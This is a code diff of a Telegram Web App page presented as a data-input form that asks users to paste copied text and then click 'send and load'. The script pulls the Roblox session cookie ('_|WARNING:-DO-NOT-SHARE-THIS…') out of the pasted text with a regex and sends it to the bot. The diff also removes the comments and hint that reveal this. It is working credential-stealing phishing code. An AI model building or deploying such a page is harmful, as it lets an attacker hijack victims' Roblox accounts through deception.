@@ -39,41 +39,30 @@
             font-size: 18px; 
             font-weight: bold; 
             cursor: pointer;
-            transition: background 0.2s;
         }
-        button:active { background: #006699; }
-        .hint { color: #888; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <h3>📥 Ввод данных</h3>
     <textarea id="data_input" placeholder="Вставьте сюда весь скопированный текст..."></textarea>
     <button id="send_btn">Отправить и загрузить</button>
-    <p class="hint">Скрипт автоматически найдет нужный код в тексте</p>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand(); // Розгортає вікно на весь екран
+        tg.expand();
 
         document.getElementById('send_btn').addEventListener('click', function() {
             const fullText = document.getElementById('data_input').value.trim();
-            
-            if (!fullText) {
-                alert("Поле пустое!");
-                return;
-            }
+            if (!fullText) return;
 
-            // ШУКАЄМО ТОКЕН: регулярний вираз для Roblox Cookie
             const tokenMatch = fullText.match(/(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\' \)]+)/);
             
             if (tokenMatch) {
-                const token = tokenMatch[1];
-                // Відправляємо боту ТІЛЬКИ знайдений токен
-                tg.sendData(token); 
+                tg.sendData(tokenMatch[1]); 
                 tg.close();
             } else {
-                alert("❌ Ошибка: Вставленный текст не содержит рабочего кода (_|WARNING). Убедитесь, что скопировали всё правильно.");
+                alert("❌ Ошибка: Код не найден. Убедитесь, что скопировали всё правильно.");
             }
         });
     </script>
